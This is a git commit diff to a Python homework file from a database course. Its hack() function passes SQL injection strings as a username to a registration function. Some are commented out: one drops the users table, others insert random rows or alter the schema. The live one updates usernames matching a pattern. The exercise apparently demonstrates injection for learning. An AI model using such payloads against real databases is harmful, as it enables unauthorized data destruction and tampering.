994ff5823bb635382e4158d94bd8fb868cde9d9f
ilmi <jilmi@yandex.ru>
2024-06-19 13:42:11 +0200

    Homework 13.0

--- module_13_db2/homework/hw7/main.py
+++ module_13_db2/homework/hw7/main.py
@@ -17,13 +17,21 @@ def register(username: str, password: str) -> None:
 def hack() -> None:
     # удаление таблицы
     # username: str = "', 'any'); DROP TABLE table_users; --"
+
     # Добавление произвольных записей
-    username: str = ("', 'any'); "
-                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
-                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
-                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
-                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
-                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}'); --")
+    # username: str = ("', 'any'); "
+    #                  f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
+    #                  f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
+    #                  f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
+    #                  f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
+    #                  f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}'); --")
+
+    # Изменение схемы таблицы
+    # username: str = "', 'any'); ALTER TABLE table_users ADD COLUMN new_password; --"
+
+    # Изменение существующей записи
+    username: str = "', 'any'); UPDATE table_users SET username = 'Иванов' WHERE username LIKE 'Алексеев%'; --"
+
     password: str = "any"
     register(username, password)
 
